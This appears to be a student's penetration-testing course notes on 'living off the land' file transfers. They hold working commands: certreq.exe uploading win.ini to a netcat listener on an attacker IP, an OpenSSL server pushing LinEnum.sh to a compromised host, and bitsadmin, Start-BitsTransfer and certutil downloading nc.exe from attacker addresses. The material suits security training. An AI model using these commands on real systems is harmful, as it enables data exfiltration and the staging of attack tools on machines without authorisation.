Living off the Land binaries can be used to perform functions such as:
- Download
- Upload
- Command Execution
- File Read
- File Write
- Bypasses


# Let's use CertReq.exe as an example:
---
- **We need to listen on a port on our attack host for incoming traffic using Netca**t and then execute certreq.exe to upload a file.
- Listen on Attacker Box:
	- `nc -lnvp 8000`
- Upload win.ini to our Attacker Box:
	- `certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini`
- This will send the file to our Netcat session, and we can copy-paste its contents.
- ![[Pasted image 20250623065236.png]]

# GTFOBins
---
- To search for the download and upload function in [GTFOBins for Linux Binaries](https://gtfobins.github.io/), **we can use `+file download` or `+file upload`.**

## OpenSSL
---
- We need to create a certificate and start a server in our Pwnbox / Attacker Machine:
	- `openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem`
- Stand up the Server in our Pwnbox:
	- `openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh`
- Next, with the server running, we need to download the file from the compromised machine:
	- `openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh`

# Other Common Living off the Land tools
---
## Bitsadmin Download function
- The [Background Intelligent Transfer Service (BITS)](https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal) can be used to download files from HTTP sites and SMB shares. 
- It "intelligently" checks host and network utilization into account to minimize the impact on a user's foreground work.

- File Download with Bitsadmin:
	- ` bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe`
- PowerShell also enables interaction with BITS, enables file downloads and uploads, supports credentials, and can use specified proxy servers.
- Download:
	- `Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"`

## Certutil
---
- Download a File with Certutil:
	- `certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe`